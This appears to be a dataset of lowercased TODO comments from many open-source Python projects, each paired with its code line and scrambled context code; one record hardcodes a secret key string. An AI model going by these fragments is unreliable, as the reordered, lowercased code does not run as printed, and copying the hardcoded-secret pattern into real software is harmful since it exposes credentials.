# todo: hints </s> child = child or self.get_default_child()	golf escape=False): Either pass in regexp(s) desired from the output as a string or a list, or an md5sum of the output wanted. if expect_type == 'regexp': if type(expect) == str:
# todo: consider paging for large result sets </s> tree = parse(f)	parser r = requests.get(objconf.url, params=params, stream=True) f = r.raw root = tree.getroot() results = root.find('results')
# todo: this probably needs app_id too </s> return (formes().	get_form_export_base_query def get_form_export_base_query(domain, xmlns): domain(domain) .xmlns(xmlns)
# todo: https://github.com/microsoft/ptvsd/issues/137 </s> self.assert_received(self.debugger, [])	test_unknown self.assert_vsc_received(received, [])
# todo: fix this, this is one of the few cases where using the config </s> self.standalone = self.config.get('standalone', false)	Job default='DEBUG') self.__logging_handlers = {} if self.config.get('run.dry_run.enabled'):  # Modify args for dry-run unique_id = self.config.get('run.unique_job_id')
# todo: should not apply if the exception is from _run_command </s> self._transaction_failed = true	_process_command except redis.ResponseError as exc: if self._transaction is not None: result = exc result = self._decode_result(result)
# todo: only return distribute if setuptools < 0.7 </s> distribute = list(parse_requirements('distribute'))	parse founded_req = reqs[0] if founded_req.project_name == 'setuptools': if len(distribute) == 1: return distribute[0]
# todo: https://github.com/horovod/horovod/issues/2438 </s> assert resources.get("cpu", 0) == 2, resources	test_colocator ip_address = services.get_node_ip_address()
# todo generator </s> handle_dirty_dataset(ds, mode=if_dirty)	__call__ for ds_path in content_by_ds: ds = Dataset(ds_path) content = [ap['path'] for ap in content_by_ds[ds_path] if ap.get('type', None) != 'dataset' or ap['path'] == ds.path]
# todo: wrap backend call in error handling. </s> return backend.playback.get_time_position().get()	get_time_position backend = self._get_backend(self.get_current_tl_track()) if backend: else: return 0
# todo: review </s> raise notimplementederror	GBlock self.conv = spectral_norm(self.conv) if activation == 'glu': self.glu_conv = nn.ConvTranspose1d(ninputs, fmaps, kwidth, stride=pooling,
# todo: deal with the event in which create_circuit fails after the first_hop has been selected </s> self.create_circuit(2, circuit_type_rendezvous, self._create_rendezvous_point)	create_rendezvous_point def create_rendezvous_point(self):
# todo(asalkeld) support versions </s> opts = '-b -y'	_handle_gem_packages def _handle_gem_packages(self, packages): very basic support for gems for pkg_name, versions in packages.iteritems(): if len(versions) > 0:
# todo: there's a race with the initial "output" event. </s> wait(reason="event 'output'")	test_launch_ptvsd_client ], ) (req_initialize, req_launch, req_config ) = lifecycle_handshake(session, 'launch')
# todo: convert non uris to file uris. </s> for line in data.readlines():	parse_m3u def parse_m3u(data): if not line.startswith('#') and line.strip(): yield line
# todo semantic validation </s> create_response = self.client.create(fsid, crush_rule, rule_data)	CrushRuleViewSet rule_data = serializer.get_data() rule_data['steps'] = request.DATA['steps'] assert 'request_id' in create_response return Response(create_response, status=status.HTTP_202_ACCEPTED)
#todo: search text as well as title, figure out best way to sort results </s> return run_query(wf, log, sqlquery)	search_notes_by_title def search_notes_by_title(wf, log, query): sqlQuery = NOTE_TITLE_SEARCH.format(query)
raise notimplementederror  # todo </s> @asyncio.coroutine	XBoardProtocol @asyncio.coroutine def play(self): def analysis(self): raise NotImplementedError  # TODO
# todo: this doesn't clean up the index </s> for model in (	delete_project return logger = delete_project.get_logger() TagKey, TagValue, GroupTagKey, GroupTag, GroupCountByMinute, ProjectCountByMinute, Activity, EventMapping, Event, Group):
# todo: this is slow, we should have a better accessor </s> for eq_ann in ann_obj.get_equivs():	_delete_arc_equiv def _delete_arc_equiv(origin, target, type_, mods, ann_obj): if (unicode(origin) in eq_ann.entities and unicode(target) in eq_ann.entities and
# todo move the file obj into the decrypt to do streaming </s> file_data = await s3_response['body'].read()	S3CSE return s3_response if 'x-amz-key' in metadata: body = await self._decrypt_v1(file_data, metadata, actual_range_start) else:
# todo: include args in description </s> description = "event triggered by text containing '%s'" % trigger_text	search_anns_for_event restrict_types = [] if restrict_types is None else restrict_types ignore_types   = [] if ignore_types is None else ignore_types if restrict_types != []: description = description + ' (of type %s)' % (",".join(restrict_types))
# todo: it can be also: </s> return false	is_struct_info if v.name == "make-struct-info": return True
# todo featureparams nameids </s> t.table.lookuplist.mapmarkfilteringsets(markfilteringsetmap)	layoutPostMerge markFilteringSetMap = NonhashableDict(GDEF.table.MarkGlyphSetsDef.Coverage)
# todo: implement '-view ' </s> advanced = parser.add_argument_group('advanced options')	create_analyze_parser help="""Cause the results as a set of .plist files with extra information on related files.""") advanced.add_argument( '--use-analyzer',
#todo: redo this with html parser instead of regex </s> return htmlparser.results	local htmlparser.feed(xml_str)
# todo: check </s> return arm_is_cbranch(insn)	aarch64_is_cbranch def aarch64_is_cbranch(insn):
### todo: method to register this system as brand new </s> logging.error("error finding %s: %s", host.hostname, detail)	install_host system = server.find_system({"name" : host.hostname})[0] except IndexError, detail: raise ValueError("No system %s registered on install server" % host.hostname)
pass  # todo: finish implementation </s> def browser_name(self, value: str):	browser_name @browser_name.setter
# todo handle when something happens during writing of data. </s> _log.error('some things didnt work')	publish_to_historian self.report_all_handled() else:
# todo: and results </s> return asynclist(tasks)	Mount tasks = [mounter.add(path, recursive=recursive) for path in options['<device>']] else: return mounter.add_all(recursive=recursive)
# @todo: add more comprehensive show validation </s> try:	displayShow def displayShow(self, show=None): show = int(show)  # fails if show id ends in a period SickRage/sickrage-issues#65 show_obj = Show.find(app.showList, show)
replace = re.sub('\$(\d+)', r'\\\1', replace)   #map $1 to \1 etc.   #todo: also need to escape any existing \1 etc. </s> rules.append((rule['field']['value'], match, replace))	pipe_regex match = util.get_value(rule['match'], kwargs) #todo use subkey? replace = util.get_value(rule['replace'], kwargs) #todo use subkey? for item in _INPUT: for rule in rules:
# todo: decide which one to use </s> self.options = metadata.get("options", {})	__init__ for cube in metadata.get("cubes", []): self.cubes_metadata[cube["name"]] = cube self.options.update(metadata.get("browser_options", {}))
# todo(inf) de-wx!, needed for wx3, check if needed in phoenix </s> if destroy: self.combobox.unbind(wx.evt_size)	INIDetailsPanel super(INIDetailsPanel, self).ClosePanel(destroy) settings['bash.ini.lastDir'] = self.lastDir
# todo complete this method </s> return vector_to_amplitudes_ee(vector, kshift, nkpts, nmo, nocc, kconverv)	vector_to_amplitudes def vector_to_amplitudes(self, vector, kshift=None, nkpts=None, nmo=None, nocc=None, kconverv=None):
# todo disconnect dealer/router </s> pass	HelloWorldMessage print() finally:
options['taskid'] = none # todo </s> agent = pulpagent(consumer)	update if consumer is None: raise MissingResource(id) agent.update_units(units, options)
# todo: test this </s> style = element.style	handle_computed_line_height def handle_computed_line_height(element, font_size): Relative values of line-height are relative to font-size. assert len(element.style['line-height']) == 1 value = element.style['line-height'][0]
if self.is_direct_mode() or not allow_quick:  # todo: thin mode </s> try:	file_has_content list of bool For each input file states either file has content locally out, err = self._run_annex_command('find', annex_options=files, expect_fail=True)
# todo: move update_spec to worker. agent should not hold these execution details. </s> if time_percentage is none:	get_action - action - the preprocessed states time_percentage = self.timesteps / self.update_spec.get("max_timesteps", 1e6) extra_returns = {extra_returns} if isinstance(extra_returns, str) else (extra_returns or set())
# todo(pts): unify /encoding dicts globally, not only for </s> obj_nums = copy_encoding_dict.get(fd_obj_num)	OptimizeType1CFonts
# todo: handle string array reflection </s> pd.testing.assert_series_equal(hpat_func(s1), test_impl(s2))	test_series_fillna_str_inplace1 hpat_func = hpat.jit(test_impl)
# todo: it seems that yahoo! converts relative links to </s> content = unicode(f.read(), 'utf-8')	pipe_xpathfetchpage url = util.get_abspath(url) f = urlopen(url) if context and context.verbose: print '............Content .................'
# todo: pandas formula is better or welford? </s> delta2 = val - mean_x	_column_std_impl_linear delta = val - mean_x mean_x += delta / nobs ssqdm_x += delta * delta2 v = hpat.hiframes_rolling.calc_var(2, nobs, mean_x, ssqdm_x)
# todo: g+ has a multiply-valued 'urls' field. ignoring for now because </s> url = actor.get('url')	create_new if user_json: actor = new.as_source.user_to_actor(json.loads(user_json)) if url: try:
## \todo adjust for #1438. </s> constant["format"].setvalue( gafferimage.format( iecore.box2i( iecore.v2i( 0 ), iecore.v2i( 255, 255 ) ), 1 ) )	testMismatchedDataWindow def testMismatchedDataWindow( self ) : constant = GafferImage.Constant() crop = GafferImage.Crop() crop["in"].setInput( constant["out"] )
# todo: use valid_episodes.mask for mean </s> kls.append(kl_divergence(pi, pi_old).mean())	mean_kl raise NotImplementedError('Only `Categorical` and `Normal` ' 'policies are valid policies.') return torch.mean(torch.cat(kls, dim=0))
raise deprecatedtest # this test is now broken. todo: fix it. </s> site = make_test_site()	test_aliases_view_request def test_aliases_view_request(): aliases = {'id_select': 'id', 'name_select': 'name', 'remote_select': 'remote.name'} req = normalize_request({'remote.name': None}, {'remote.name':'truc'})
# todov06 updatetablerow instead </s> for i in self.arrayofusers[userindex+1:]:	deleteUser self.deletedUserCount += 1 if len(self.arrayOfUsers) > userIndex+1: i._tableRow -= 1 self.lock.release()
# todo(solitude): remove this. </s> adp.update(**form.cleaned_data)	paypal_setup_confirm pk = client.create_seller_for_pay(addon) client.patch_seller_paypal(pk=pk, data=form.cleaned_data) messages.success(request, msg) if source == 'paypal' and addon.is_incomplete() and addon.paypal_id:
invoice.objects.filter(subscription=sub).latest('date_due').date_due # todo - check query </s> if len(invoice.objects.filter(subscription=sub)) != 0 else 'none on record',	ManageBillingAccountView 'form': self.account_form, 'subscription_list': [(sub, ) for sub in Subscription.objects.filter(account=account)], }
# todo add negative sampling? </s> l1 += dot(ga, l2a)  # learn input -> hidden	train_sentence ga = (1 - word.code - fa) * alpha  # vector of error gradients multiplied by the learning rate model.syn1[word.point] += outer(ga, l1)  # learn hidden -> output return len([word for word in sentence if word is not None])
# todo: this is untested. </s> _raise_current_error()	load_certificate_request raise ValueError("type argument must be FILETYPE_PEM or FILETYPE_ASN1") if req == _ffi.NULL: x509req = X509Req.__new__(X509Req) x509req._req = _ffi.gc(req, _lib.X509_REQ_free)
limit = 20  # todo: change to setting </s> comment = "[poll name=foo]\n" \	test_markdown_poll_choice_limit_pre_exceeded def test_markdown_poll_choice_limit_pre_exceeded(self): Should not exceed the limit "1. opt 1\n" \ "2. opt 2\n" \
# todo: add more field checks here </s> self.assertequal(self.sounds[i].user.username, sound.username)	test_bulk_query_solr_field_contents for i, sound in enumerate(Sound.objects.bulk_query_solr(sound_ids=self.sound_ids)):
# todo(sdague): remove in juno </s> def belongs_to_instance_legacy(disk):	belongs_to_instance_legacy pattern = '%s_' % instance['name'] if disk.startswith(pattern):
# todo, pass complete checkpoint as state dictionary </s> self.mp_queue.put(best_model_path)	__transfer_distrib_spawn_state_on_fit_end self.checkpoint_io.save_checkpoint(state_dict, last_path) if self.local_rank == 0: self.mp_queue.put(last_path) self.mp_queue.put(results)
# todo(akshayka): remove the in_graph_mode check once caching devices are </s> if in_graph_mode and varscope_caching_device_was_none:	foldl back_prop=back_prop, swap_memory=swap_memory) varscope.set_caching_device(None) return output_pack(r_a)
# todo make this smarter about more complex configurations (backup original values, etc) </s> obj_doc['dps'][switch_found]['timeout'] = self.reinvestigation_frequency	config if ok: if action == 'mirror': obj_doc['dps'][switch_found]['arp_neighbor_timeout'] = self.reinvestigation_frequency if not port in obj_doc['dps'][switch_found]['interfaces'][self.mirror_ports[switch_found]]['mirror'] and port is not None:
# todo xxx graalvm change </s> raise unittest.skiptest("missing threading support")	test_rude_shutdown self.fail('connecting to closed SSL socket should have failed') t = threading.Thread(target=listener) t.start() try:
#todo load this from somewhere </s> pad_data = [-1.46374, -0.151816, -0.161173, 0.0686325, 0.0231148, -0.154613,	allocate_devices device.targets[:l, q] = self.data.targets[self.data.seq_start[s] + batch.start[1]:self.data.seq_start[s] + batch.start[1] + l] if self.pad_batches: -0.105614, 0.00550198, 0.0911985, 0.00502809, 0.0512826, -0.0181915, 0.0225053, -0.00149681, 0.0782062, 0.0412163, 0.0526166, -0.0722563,
# todo(b/114938612): eventually remove this override. </s> validate=false,	testPreprocessingFn file_pattern=os.path.join(self._testdata_path, 'csv_example_gen/train/*'), telemetry_descriptors=['Tests'], schema=legacy_metadata.schema)
# todo implement some tolerance </s> self.assertequal(a, b)	test_cpu_times assert b[0] >= 0, b else:
# todo(sharadmv): don't drop the custom derivative rule </s> del primitive, fwd, bwd, out_trees  # unused.	process_custom_vjp_call def process_custom_vjp_call(self, primitive, fun, fwd, bwd, tracers, out_trees): return fun.call_wrapped(*tracers)
# todo(mattjj): revise this approach </s> from .numpy import inexact	_closure_convert_for_avals wrapped_fun, in_pvals, instantiate=True, stage_out=False)  # type: ignore out_tree = out_tree() is_float = lambda c: dtypes.issubdtype(dtypes.dtype(c), inexact) (closure_consts, hoisted_consts), merge = partition_list(is_float, consts)
# todo: remove in 1.2 </s> with pytest.warns(futurewarning):	test_warn warnings.simplefilter("ignore", UserWarning) filters_orig = warnings.filters[:] assert assert_warns(UserWarning, f) == 3 assert warnings.filters == filters_orig
# todo: if a logographic word list is added to electrum2, might need to revisit this (no spaces) </s> return hmac.new("seed version", " ".join(mnemonic_words), hashlib.sha512) \	_verify_checksum @staticmethod def _verify_checksum(mnemonic_words): .digest()[0] == "\x01"
# todo: remove when we stop using buildbot. </s> self.execute(	cancel_job :param job dict: A job object (typically a result of get_job) self._job_action_event(job, 'cancel', requester) proc='jobs.updates.cancel_job', placeholders=[job['job_guid']],
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_comparison def test_comparison(self):
# todo(metzman): change the strategy to record which plugin was used, and </s> fuzzing_strategies.append(strategy.mutator_plugin_strategy)	main if mutator_plugin_path: logs.log('Using mutator plugin: %s' % mutator_plugin_path) extra_env['LD_PRELOAD'] = mutator_plugin_path fuzz_result = runner.fuzz(
# todo: more error handling </s> self._ds         = ds	__init__ def __init__(self, playbook, ds): self.playbook    = playbook self.hosts       = ds.get('hosts', None)
# todo: insert or make chord </s> v.insert(rn.measureoffset, n)	_createReduction v = gMeasure.voices[0] n, te = rn.getNoteAndTextExpression() if te is not None: v.insert(rn.measureOffset, te)
#todo - oauth </s> curl = 'curl -l '	curl_from_request def curl_from_request(request): auth = '' if request.auth is not None:
# todo: replace this with proper storage reporting </s> if has_lvm:	_ComputeStorageData @return: tuple of storage info (total_disk, free_disk, total_spindles, free_spindles) total_disk = IAllocator._GetAttributeFromNodeData(node_info, node_name, "storage_size")
# todo: register a custom error handling function to replace </s> regex = regex.encode('utf8', 'replace')	_compile_byte_regex def _compile_byte_regex(cls, regex): if not isinstance(regex, bytes): try: compiled = re.compile(regex + b"(?m)")
# todo: this needs refactoring </s> def get_table_line(entry, genome_filename):  # pragma: no cover	get_table_line line_parts = [entry.get('assembly_accession', ''), entry.get('bioproject', ''),
# todo: hydrate directly instead of via http hydration </s> if isinstance(obj, boltnode):	rehydrate def rehydrate(self, obj, inst=None): return Node.hydrate({ "self": "%snode/%d" % (self.graph_uri, obj.identity),
# todo username </s> return 'aqbwdj5qap6lhhaaskvbnukyhj7eyremko5qka=='	get_monitor_secret def get_monitor_secret():
# todo: migrate to new tilegrid format via library. </s> return tiles, mk_segments(tiles)	mk_grid os.getenv("XRAY_DATABASE")), "r") as f: tiles = json.load(f)
# todo: handle fixed and % widths </s> raise typeerror('width %s is unknown' % box.width)	block_preferred_minimum_width return 0 else:
# todo: give a vanilla example </s> .. math::	feca def feca(predicted_power, df_appliances_ground_truth): fraction = \\sum_n min \\left (
# todo: this case is not fused! </s> (theano.tensor.mul(fx,ftanx,ftanx,fx),(fx,),(fxv,),2,fxv*numpy.tan(fxv)*numpy.tan(fxv)*fxv,'float32'),	do (theano.tensor.mul(fx,fx,fx,fx),(fx,),(fxv,),1,fxv*fxv*fxv*fxv,'float32'), (theano.tensor.mul(fx,ftanx,ftanx),(fx,),(fxv,),2,fxv*numpy.tan(fxv)*numpy.tan(fxv),'float32'), (theano.tensor.mul(ftanx,ftanx,fx+fy),(fx,fy),(fxv,fyv),2,numpy.tan(fxv)*numpy.tan(fxv)*(fxv+fyv),'float32'), ]
# todo postremora replace the above with this line when remora goes away </s> return http.httpresponseredirect(reverse('users.login') + '?m=4')	confirm amo.utils.clear_messages(request)
# todo(efried): due to bug #1782386, swap is not being reported. </s> 30,	test_volume_backed_no_disk_allocation self.assertEqual(expected_usage, resources['DISK_GB']) self.assertEqual( self.admin_api.get_hypervisor_stats()['local_gb_used'])
# tracks a suggested todo, which will reduce the 3 rpc calls here to only </s> translator = contracttranslator(channel_manager_abi)	get_channel_new_events def get_channel_new_events(self, token_address, from_block, to_block=''): token_address_bin = address_decoder(token_address) channel_manager = self.raiden.chain.manager_by_token(token_address_bin)
# todo should we pass? </s> pass	WeatherCache else: _log.debug("In WeatherCache: Invalid request type: ?", request_type) self.trim_period = cache_period try:
# todo check error message </s> assert response.status_code == 400	test_serialization_exception_on_included response = self.app.get('/api2/person/1/articles/1?include=author')
# todo: div by zero error if all data exists at a single point. </s> pixels_per_degree = pixels_per_lat = float(options.height - padding) / bounding_box_xy.sizey() * scale_factor	AutoSetScale padding *= 2 # padding-per-edge -> padding-in-each-dimension if options.height: if options.width: pixels_per_degree = float(options.width - padding) / bounding_box_xy.SizeX() * SCALE_FACTOR
# todo private access </s> yield func_execution._arguments	_check_name_for_execution if compare_node == value_node: for func_execution in create_func_excs(value): elif isinstance(value.parent_context, FunctionExecutionContext) and \ compare_node.type == 'funcdef':
# todo(hartikainen): once tfp.bijectors.chain supports conditioning, </s> return x	_forward for bijector in self.flow: x = bijector.forward(x, **conditions.get(bijector.name, {}))
# todo(b/160795287): deprecate estimator based executor. </s> fn_args_dict = fn_args.get_dict()	run_fn fn_args: Holds args used to train the model as name/value pairs. schema = io_utils.parse_pbtxt_file(fn_args.schema_file, schema_pb2.Schema()) fn_args_dict['serving_model_dir'] = os.path.join(fn_args.model_run_dir, path_utils.SERVING_MODEL_DIR)
# todo: use shlex.quote as soon as a newer python version is available. </s> return pipes.quote(path)	quote def quote(self, path):
# todo: support other deployment situations. </s> return (	is_production def is_production(): os.environ.get('SERVER_SOFTWARE', '').startswith('Google App Engine'))
assert self.restart_seq is none #todo: better handling of this situation </s> l.debug("initializing restart sequence")	restart_program assert self.start_seq is None #TODO: Better handling of this situation assert self.stop_seq is None #TODO: Better handling of this situation self.stop_seq = sequence_controller() self.restart_seq = sequence_controller()
# todo: this test requires manifold access, see: t88318502 </s> self._test_model("coco-instancesegmentation/mask_rcnn_r_50_fpn_3x.yaml")	testMaskRCNN def testMaskRCNN(self):
# todo remove backwards compatability fix in a future version </s> if build_version < 11000:	plugin_loaded preferences = sublime.load_settings('Preferences.sublime-settings') build_version = int(preferences.get('neovintageous_build_version', 0)) preferences.set('neovintageous_build_version', 11000) preferences.set('vintageous_use_ctrl_keys', preferences.get('vintageous_use_ctrl_keys'))
# todo: use cli.output.write </s> interface.rprint(result)	_process_input result = interface.reval(code) if api.visible(): except SyntaxError as e: status[0] = False
# todo: check if output is spent (still neccessary?) </s> o.spent = none	gettransaction input_total += i.value for o in t.outputs: output_total += o.value t.hash = tx_id
#todo same issue with batch_size </s> if len(self.inputs) == 0:	channels def channels(self): raise ValidationException("gan.channels() requested but no inputs provided") return self.ops.shape(self.inputs[0])[-1]
# todo: requires special treatment? </s> current_unit = line.variants[0].line[0]	restock_ability :rtype: ...dataformat.expected_pointer.ExpectedPointer if isinstance(line, GenieVillagerGroup): else: current_unit = line.line[0]
# todo: make test method </s> ssl             # missing ssl extension?	test_ssl def test_ssl(): import ssl return True
# todo: only write this when the checksums file changed </s> with open(os.path.join(full_output_dir, 'md5sums'), 'w') as handle:	create_downloadjob checksums = grab_checksums_file(entry) if not config.flat_output: handle.write(checksums) parsed_checksums = parse_checksums(checksums)
# todo: check that the birth date is not in the future </s> except valueerror, e:	is_valid try: birth_date = get_birth_date(number) return False return True
#todo: http://www.6502.buss.hk/6502-instruction-set/jmp says that there is a indirect </s> self.assertequals(code, [0x4c, 0x34, 0x12])	test_jmp_abs code = semantic(ast)
# todo: do not store message if the ajax client stats that it will not redirect </s> data.update({	_return_celery_result else: messages.error(self.request, self.get_error_message(res.info)) 'redirect': self.get_error_url(), 'message': str(self.get_error_message(res.info))
# todo: check output </s> output = run_model(prob)	test_feature_set_solver_print1 prob.setup(check=False)
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_fail_seed_null def test_fail_seed_null(self): ``seed`` is null.
# todo: is wavelet centred properly? </s> y_0 = self.wavelet	reconstruction dt = self.dt C_d = self.C_d W_n = self.wavelet_transform s = np.expand_dims(self.scales, 1)
# todo(b/186439691): remove when placer is fixed. </s> _add_skip_zero_before_finalize_dataset(graph_def)	_ensure_comp_runtime_compatible num_gpu_devices = len(tf.config.list_logical_devices('GPU')) if num_gpu_devices > 0: if num_gpu_devices > 1: _check_dataset_reduce_for_multi_gpu(graph_def)
# todo: remove this when domain decomposition is merged </s> warnings.warn('this feature is not yet implemented in a release ' \	set_dd_count_interactions def set_dd_count_interactions(self, interactions): 'version of openmc') if not type(interactions) == bool:
# todo: return a list of chapters to download </s> raise not_implemented	get_range_from_volumes def get_range_from_volumes(volumes, times=0):
#todo: implement xml support </s> return "whatever, we don't have xml yet"	create_token con.close() elif content == 'application/xml': accept_header = request.header.get('Accept') if accept_header in content_types:
# todo:: fix typing in later version of numpy </s> y.flat[locs] = np.nan  # type: ignore	generate_panel_data if missing > 0: locs = rng.choice(n * t, int(n * t * missing)) locs = rng.choice(n * t * k, int(n * t * k * missing)) x.flat[locs] = np.nan  # type: ignore
# todo handling when g is a list of graphs </s> if true:	plot_graph def plot_graph(G): ki, kj = np.nonzero(G.A) if G.directed:
# todo: make sure this openssl command works everywhere, maybe we should use a text_base64_decode? </s> result = run("echo '%s' | openssl base64 -a -d -out %s" % (base64.b64encode(content), shell_safe(location)))	file_write **{MODE_SUDO: use_sudo} ): if "openssl:Error" in result: fabric.api.abort('cuisine.file_write("%s",...) failed because openssl does not support base64 command.' % (location))
# todo get this from config </s> storage_server = "http://localhost:8000/api/v1/"	_storage_api def _storage_api(): api = slumber.API(storage_server) return api
# @todo: test </s> return self.activefitid	getActiveFit def getActiveFit(self):
# todo/perf: users_id iterates over all items of all collections </s> for linked_datablock in library_datablock.users_id:	register_indirect library_datablock = bpy.data.libraries.get(self._data["name"]) if library_datablock: if repr(linked_datablock) == identifier: return linked_datablock
# todo(yanase): change `task` in storages to `direction`. </s> self.storage.set_study_task(self.study_id, _direction)	optimize 'Currently, Optuna supports `MINIMIZE` only.'.format(self.study_name)) if self.direction == structs.StudyTask.NOT_SET: elif self.direction != _direction: raise ValueError(
# todo(jay-lau-513) translate the contents to a json stdin </s> out, err = utils.trycmd('echo contents | kubectl', 'create',	pod_create contents.pod_definition_url) else: '-f', '-') if err:
# todo: try mlp rather than bilinear </s> self.logits_edge = tf.reshape(bilinear_multi(emb_first,emb_second,out_dim=ob['adj'].get_shape()[1]),[-1,ob['adj'].get_shape()[1]])	_init emb_second_real = tf.boolean_mask(emb_node, mask_real) emb_second_real = tf.expand_dims(emb_second_real, axis=1) pd_edge = CategoricalPdType(-1).pdfromflat(self.logits_edge) ac_edge = pd_edge.sample()
# todo: another way to provide a (set of) potential defined object(s) </s> obj = none	_from_oer Obj = const_obj[0] else: val_bytes = ASN1CodecOER.decode_open_type(char) val = Obj.from_oer(val_bytes) if (Obj is not None) else val_bytes
# todo: handle situations where share is password protected </s> pathname = string.replace(pathname,'/', '\\')	mkdir def mkdir(self, shareName, pathName, password = None): pathName = ntpath.normpath(pathName) if len(pathName) > 0 and pathName[0] == '\\':
# todo have one global properties object so this is no longer necessary </s> exporter.node_cache.clear()	export def export(self, exporter, props, luxcore_name): if self.inputs["Volume"].is_linked: self.inputs["Volume"].export(exporter, props, luxcore_name)
# todo: weather data source changed, temporarily disable, will enable it later when new data source is available. </s> self._is_temp = is_temp	CitiBikeTopology super().__init__() self._data_pipeline["trip"] = CitiBikePipeline(topology, trip_source, station_info, is_temp) def __del__(self): if self._is_temp:
# todo: detect if this untracked pending transaction is a commitment transaction at all. </s> message = f"we have an untracked pending transaction. issuing a replacement transaction."	__handle_replacement_commitment tx_firing_block_number, txhash = list(sorted(self.pending.items()))[0] if txhash is UNTRACKED_PENDING_TRANSACTION: else: wait_time_in_blocks = current_block_number - tx_firing_block_number
# todo is_compiled_with_cuda() has not been moved </s> compiled_with_cuda = paddle.fluid.is_compiled_with_cuda()	get_sys_env pass env_info['Python'] = sys.version.replace('\n', '') env_info['Paddle compiled with cuda'] = compiled_with_cuda if compiled_with_cuda:
# todo: test re-authentication when the token expires </s> test_data.alice.certificate)	testRaisesOnNonAuth "dontcreateausercalledthis",
# todo(b/171088214): remove it after the control dependency in </s> with tf.control_dependencies([grad]):	_resource_apply_sparse def _resource_apply_sparse(self, grad, var, indices, apply_state=None): lr_t, kwargs = self._get_lr(var.device, var.dtype.base_dtype, apply_state) decay = self._decay_weights_op(var, lr_t, apply_state)
# todo username </s> sudo = args.pushy('ssh+sudo:{hostname}'.format(	zapdisk for hostname, disk in args.disk: log.debug('zapping %s on %s', disk, hostname) hostname=hostname, ))
# todo: make truly async </s> async def get_users(self, project_id, instance_name):	CloudSQLFacade request = self._cloudsql_client.instances().list_next(previous_request=request, previous_response=response) return database_instances users = self._cloudsql_client.users().list(project=project_id, instance=instance_name).execute() return users.get('items', [])
# todo: fails because of missing svg support </s> assert_pixels('inline_image_' + filename, 8, 8, image, '''	test_images )) def test_images(filename, image): <style> @page { size: 8px }
# todo: determine between create and/or start? </s> self.docker_client.start(container_id)	_start if container_id is None: return device = self._init_container(container_id, container) updated_containers = state.containers
# todo(jeremydw): thread pool. </s> threads = []	dump bucket.configure_website(main_page_suffix='index.html', error_key='404.html') paths_to_contents = pod.dump() for path, contents in paths_to_contents.iteritems(): thread = threading.Thread(target=self._upload, args=(bucket, path, contents))
# todo log/warn </s> return none	_try_load_impl_from_modname implementation_mod = importlib.import_module(implementation_modname) except (ImportError, SyntaxError): return _try_load_impl_from_mod(implementation_mod, api_type)
# todo: handle exceptions </s> return make_response(500)	handle_request raise NotImplementedError except Exception as e: else: return make_response(500)
# todo document - how to deal with web media vs. normal? </s> if isinstance(self.result, types.botinlineresult):	document @property def document(self): return self.result.content elif isinstance(self.result, types.BotInlineMediaResult):
# todo: is this the right str? </s> excstr = "runtimeerror('something went wrong',)"	test_exception_break tid = self.send_event(10, CMD_ADD_EXCEPTION_BREAK) received = self.vsc.received self.assert_vsc_received(received, [ self.expected_event(
# todo!! add more assertions for the smaller subsystems </s> def test_all_complexes_standard(standard, flushcache, restore_fs_cache):	test_all_complexes_standard flushcache() complexes = list(compute.all_complexes(standard))
'type': 'string', #todo: resolve </s> 'comment': ''	execute 'meta': [{ 'name': col[0] if type(col) is dict or type(col) is tuple else col, } for col in metadata] if has_result_set else [], 'type': 'table'
# todo(jaypipes): port nova's fault infrastructure </s> self.assertraises(exception.notfound, req.get_response, controllers.api())	test_update_image_not_existing req.method = 'PUT' req.body = json.dumps(fixture)
# todo: fix 'extract_primitives' so that the value of 'material' is none and not empty string </s> return none	__gather_materials_279 def __gather_materials_279(blender_primitive, blender_mesh, modifiers, export_settings): if not blender_primitive['material']: mesh_double_sided = blender_mesh.show_double_sided material = bpy.data.materials[blender_primitive['material']]
# @todo: return only packages for the current architecture </s> package_names = list(package_names)[:]	find_aur_packages def find_aur_packages(package_names): json_results = [] for package_name in package_names[:]:
# todo: will need some code for the tabs active terms to work </s> window_last_active_term_mapping[window]=copy.deepcopy(window.last_active_term)	layout_done window_last_active_term_mapping={} for window in self.windows: for terminal in self.terminals: if not terminal.pid:
# todo legacy method to be removed/refactored </s> from corehq.apps.commtrack.models import supplypointcase	add_location def add_location(self, location, create_sp_if_missing=False): sp = SupplyPointCase.get_or_create_by_location(location) from corehq.apps.commtrack.util import submit_mapping_case_block
federated_only=self.federated_only,  # todo: 466 </s> checksum_address=self.checksum_address,	payload base_payload = dict( is_me=self.is_me, learn_on_same_thread=self.learn_on_same_thread, abort_on_learning_error=self.abort_on_learning_error,
# todo error on missing levels </s> pass	determine_attributes dashes = dict(zip(style_levels, self.default_dashes)) elif isinstance(dashes, dict): else: dashes = dict(zip(style_levels, dashes))
#        #todo: refresh all k-buckets further away than this node's closest neighbour </s> self.hash_watcher.tick()	joinNetwork bootstrapContacts = None self._joinDeferred = self._iterativeFind(self.node_id, bootstrapContacts) yield self._joinDeferred self.refresh_node_lc.start(constants.checkRefreshInterval)
# todo: remove .nocache() when iterator() is dropped </s> self._result_cache = list(self.nocache().iterator())	_fetch_all lock = self._cacheprofile['lock'] if self._cacheprofile['write_only'] or self._for_write: self._cache_results(cache_key, self._result_cache) else:
#todo use logging </s> print e	check_update return check_update_function(SOURCE_VERSION_URL) except Exception, e:
# todo: validate and mask this before it's selected </s> show_invalid_depstring_notice(pkg, dep_string, str(e))	_add_pkg_deps del e continue return 0 if not dep_string:
# todo generator </s> handle_dirty_dataset(ds, mode=if_dirty)	__call__ for ds_path in content_by_ds: ds = Dataset(ds_path) content = [ap['path'] for ap in content_by_ds[ds_path] if ap.get('type', None) != 'dataset' or ap['path'] == ds.path]
# todo: for training data (but not validation), do data augmentation here. </s> details = _crop_planetlab_images(_get_planetlab_details(input_metadata, input_images), output_images)	prepare_data print "Preparing data..." print "\tParsing Planet Labs data into independent cropped bounding boxes using %s..." % input_metadata print "\t\tClass details before balancing (balancing not implemented yet):" _print_input_details(details)
# todo: remove in 0.7.0 </s> if not isinstance(state_name, string_types):	to_state model (class): The model that should be used. state_name (str): Name of the destination state. warnings.warn("'HierarchicalMachine.to' has been renamed to 'HierarchicalMachine.to_state' and " "will be removed in transitions version 0.7.0.", DeprecationWarning)
# todo - override the 'create' method for this view, </s> return self.serializer_class(*args, **kwargs)	get_serializer kwargs['context'] = self.get_serializer_context()
# todo should this reset the pts and such? </s> self._updates.insert(0, error)	set_error Can be (and is) used to pass exceptions between threads. with self._updates_lock: self._updates_available.set()
